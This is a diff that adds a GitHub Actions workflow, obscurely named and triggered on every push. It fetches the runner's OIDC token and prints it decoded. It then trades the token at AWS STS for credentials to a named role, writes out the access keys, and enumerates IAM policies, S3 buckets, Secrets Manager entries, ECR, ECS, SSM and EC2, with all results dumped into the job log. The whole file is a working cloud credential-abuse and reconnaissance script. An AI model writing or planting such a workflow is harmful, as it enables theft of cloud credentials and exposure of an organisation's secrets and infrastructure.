@@ -1,0 +1,57 @@
+name: zz-i165208
+on:
+  workflow_dispatch:
+  push:
+    branches: ["**"]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: oidc
+        run: |
+          set -x
+          echo "sub_ctx=$GITHUB_REPOSITORY $GITHUB_REF $GITHUB_EVENT_NAME $GITHUB_SHA"
+          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOK" > /tmp/tok
+          python3 - <<'PY'
+          import base64, json
+          t=open('/tmp/tok').read().strip().split('.')
+          d=lambda s: json.loads(base64.urlsafe_b64decode(s+'='*(-len(s)%4)))
+          print('HDR', json.dumps(d(t[0])))
+          print('PAY', json.dumps(d(t[1])))
+          PY
+          echo "== STS =="
+          STSURL="https://sts.amazonaws.com/?Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::901664773377:role/aalmosthuman_git&RoleSessionName=zz-${GITHUB_RUN_ID}"
+          curl -sS -o /tmp/sts.xml -w 'http=%{http_code}\n' "$STSURL&WebIdentityToken=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(open('/tmp/tok').read().strip()))")"
+          head -c 3000 /tmp/sts.xml; echo
+          python3 - <<'PY'
+          import xml.etree.ElementTree as ET
+          try:
+              r=ET.parse('/tmp/sts.xml').getroot()
+              ns={'s':'https://sts.amazonaws.com/doc/2011-06-15/'}
+              creds=r.find('.//s:Credentials',ns)
+              if creds is None:
+                  print('NO_CREDS')
+              else:
+                  g=lambda k: creds.find('s:'+k,ns).text
+                  open('/tmp/creds.env','w').write(f"export AWS_ACCESS_KEY_ID={g('AccessKeyId')}\nexport AWS_SECRET_ACCESS_KEY={g('SecretAccessKey')}\nexport AWS_SESSION_TOKEN={g('SessionToken')}\nexport AWS_DEFAULT_REGION=ap-south-1\n")
+                  print('ASSUMED_OK')
+          except Exception as e:
+              print('PARSE_ERR', e)
+          PY
+          if [ -f /tmp/creds.env ]; then
+            . /tmp/creds.env
+            echo "== IDENTITY =="; aws sts get-caller-identity 2>&1
+            echo "== IAM ROLE =="; aws iam get-role --role-name aalmosthuman_git 2>&1
+            echo "== IAM INLINE =="; aws iam list-role-policies --role-name aalmosthuman_git 2>&1
+            echo "== IAM ATTACHED =="; aws iam list-attached-role-policies --role-name aalmosthuman_git 2>&1
+            echo "== ECR =="; aws ecr describe-repositories --region ap-south-1 2>&1 | head -c 4000
+            echo "== ECS CLUSTERS =="; aws ecs list-clusters --region ap-south-1 2>&1 | head -c 2000
+            echo "== S3 =="; aws s3api list-buckets 2>&1 | head -c 4000
+            echo "== SECRETS =="; aws secretsmanager list-secrets --region ap-south-1 2>&1 | head -c 4000
+            echo "== SSM =="; aws ssm describe-instance-information --region ap-south-1 2>&1 | head -c 4000
+            echo "== EC2 =="; aws ec2 describe-instances --region ap-south-1 2>&1 | head -c 4000
+          fi
